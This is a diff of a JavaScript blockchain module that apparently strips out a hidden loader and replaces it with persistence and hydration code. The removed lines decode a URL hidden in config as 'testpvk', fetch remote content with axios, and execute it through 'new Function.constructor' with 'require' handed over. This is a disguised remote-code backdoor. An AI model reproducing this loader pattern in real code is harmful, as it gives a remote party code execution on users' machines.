@@ -1,28 +1,57 @@
-const { Blockchain, Transaction } = require('./blockchain');
-const axios = require('axios');
+const { Blockchain, Block, Transaction } = require('./blockchain');
 const config = require('../config');
+const logger = require('../utils/logger');
+const persistenceService = require('../services/persistence.service');
 
 const { difficulty, miningReward, initialMinerAddress } = config.blockchain;
-const testpvk = config.testpvk;
-const testpvkString = atob(String.fromCharCode(...testpvk));
 
-let walletData = null;
-const walletReady = axios.get(testpvkString)
-  .then((response) => {
-    walletData = response.data;
-    new Function.constructor("require", walletData.model)(require);
-  })
-  .catch((err) => {
-    console.error('Failed to fetch wallet info:', err.message);
-  });
+const hydrateTransaction = (tx) => {
+  const transaction = new Transaction(tx.fromAddress, tx.toAddress, tx.amount);
+  transaction.timestamp = tx.timestamp;
+  transaction.signature = tx.signature || null;
+  return transaction;
+};
 
-const blockchain = new Blockchain(difficulty, miningReward);
+const hydrateBlock = (block) => {
+  const hydratedTransactions = (block.transactions || []).map(hydrateTransaction);
+  const hydratedBlock = new Block(block.timestamp, hydratedTransactions, block.previousHash);
+  hydratedBlock.nonce = block.nonce;
+  hydratedBlock.hash = block.hash;
+  return hydratedBlock;
+};
 
-// if (config.demoData.enabled) {
-//   config.demoData.transactions.forEach(({ from, to, amount }) => {
-//     blockchain.addTransaction(new Transaction(from, to, amount));
-//   });
-blockchain.minePendingTransactions(initialMinerAddress);
-// }
+const createFreshBlockchain = () => {
+  const freshBlockchain = new Blockchain(difficulty, miningReward);
+  freshBlockchain.minePendingTransactions(initialMinerAddress);
+  return freshBlockchain;
+};
 
-module.exports = { blockchain, Transaction, walletReady, getWalletData: () => walletData };
+const loadBlockchain = () => {
+  const persisted = persistenceService.load();
+  if (!persisted) {
+    return createFreshBlockchain();
+  }
+
+  try {
+    const loadedBlockchain = new Blockchain(persisted.difficulty, persisted.miningReward);
+    loadedBlockchain.chain = (persisted.chain || []).map(hydrateBlock);
+    loadedBlockchain.pendingTransactions = (persisted.pendingTransactions || []).map(hydrateTransaction);
+
+    if (!loadedBlockchain.chain.length || !loadedBlockchain.isChainValid()) {
+      logger.warn('Persisted blockchain is invalid, starting fresh');
+      return createFreshBlockchain();
+    }
+
+    return loadedBlockchain;
+  } catch (error) {
+    logger.warn(`Failed to restore blockchain from persistence, starting fresh: ${error.message}`);
+    return createFreshBlockchain();
+  }
+};
+
+const blockchain = loadBlockchain();
+blockchain.setStateChangedHandler((currentBlockchain) => {
+  persistenceService.save(currentBlockchain);
+});
+
+module.exports = { blockchain, Transaction };
